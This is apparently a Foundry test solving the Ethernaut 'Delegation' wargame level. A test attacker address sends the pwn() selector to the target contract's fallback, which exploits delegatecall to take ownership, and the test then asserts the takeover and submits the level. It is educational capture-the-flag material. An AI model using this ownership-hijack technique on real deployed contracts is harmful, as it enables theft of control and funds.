pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/levels/Delegation/DelegationFactory.sol";
import "../src/core/Ethernaut.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;
    address attacker = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(attacker, 5 ether);
    }

    function testDelegationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DelegationFactory factory = new DelegationFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Delegation target = Delegation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // (...)
        target.owner();

        // Determine the method hash, required for function call
        bytes4 methodHash = bytes4(keccak256("pwn()"));

        // Call the pwn() method via .call plus abi encode the method hash switch from bytes4 to bytes memory
        (bool result,) = address(target).call(abi.encode(methodHash));


        assertEq(target.owner(), attacker);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////


        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
